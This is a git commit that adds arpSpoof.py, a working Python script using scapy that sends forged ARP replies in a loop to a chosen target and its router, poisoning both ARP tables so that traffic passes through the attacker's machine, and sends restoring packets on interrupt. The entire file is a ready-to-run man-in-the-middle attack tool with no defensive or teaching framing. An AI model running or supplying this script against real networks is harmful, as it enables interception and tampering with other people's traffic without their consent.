307dc2cb01ebd2db382d8ef6e09303f85544e3aa
alex944591 <alex944591@gmail.com>
2022-10-28 14:30:31 +0300

    working version

---
+++ arpSpoof.py
@@ -0,0 +1,35 @@
+from scapy.layers.l2 import ARP
+from scapy.layers.l2 import getmacbyip
+from scapy.layers.l2 import get_if_hwaddr
+from scapy.all import send
+
+import sys
+
+
+def arp_spoof(target_ip, target_mac, sender_ip):
+    sender_mac = get_if_hwaddr(intf)
+    packet = ARP(op="is-at", hwsrc=sender_mac, psrc=sender_ip,
+                 hwdst=target_mac, pdst=target_ip ) #Create arp replay packet to poisoning victim's arp table
+    send(packet, verbose=False)
+
+def arp_restore(target_ip, target_mac, sender_ip, sender_mac):
+    packet = ARP(op="is-at", hwsrc=sender_mac, psrc=sender_ip,
+                 hwdst=target_mac, pdst=target_ip ) #Create arp replay packet to restore victim's arp table
+    send(packet, verbose=False)
+
+
+if __name__ == "__main__":
+    intf, t_ip, r_ip  = sys.argv[1], sys.argv[2], sys.argv[3]
+    t_mac = getmacbyip(t_ip)
+    r_mac = getmacbyip(r_ip)
+
+    try:
+        print("Sending spoofed ARP packets")
+        while True:
+            arp_spoof(t_ip, t_mac, r_ip)
+            arp_spoof(r_ip, r_mac, t_ip)
+    except KeyboardInterrupt:
+        print("Sending restoring ARP packets")
+        arp_restore(t_ip, t_mac, r_ip, r_mac)
+        arp_restore(r_ip, r_mac, t_ip, t_mac)
+        quit()
